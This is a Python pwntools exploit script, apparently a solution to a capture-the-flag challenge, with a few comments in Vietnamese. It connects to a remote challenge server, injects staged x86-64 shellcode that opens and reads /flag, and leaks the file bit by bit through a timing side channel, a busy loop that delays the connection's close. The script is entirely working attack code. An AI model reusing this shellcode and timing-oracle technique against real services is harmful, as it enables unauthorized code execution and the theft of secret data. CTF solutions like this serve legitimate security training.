#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./chall")
r = elf.process()

def leak_byte(byte_offset):
    byte = ""
    for bit_offset in range(8):
        # r = elf.process()
        r = remote("win.the.seetf.sg", 2002)
        shellcode = b"\x31\xFF\x89\xD6\x0F\x05"
        r.send(shellcode)
        shellcode2 = asm(
                shellcraft.amd64.linux.open(b"/flag")
                + shellcraft.amd64.linux.read("rax", "rsp", 0x200)
                + f'''
                shellcode3:
                    mov bl , [rsp+{byte_offset}]
                    shr bl, {bit_offset}
                    shl bl, 7
                    shr bl, 7
                    cmp bl, 0
                    je exit
                    jmp shellcode3
                exit:
                '''
        )
        r.sendline(shellcode + shellcode2)
        begin = time.time() # time tính từ lúc bắt đầu gửi shellcode
        r.recvall(timeout = 1)
        after = time.time()  #Time đến khi quá trình nhận hoàn tất.
        if((after - begin) > 1):
            byte += "1"
        else:
            byte += "0"

    print(byte)
    char = int(byte[::-1], 2)
    return char

flag = ""
for i in range (60):
    byte = leak_byte(i)
    flag += chr(byte)
    print(flag)
r.interactive()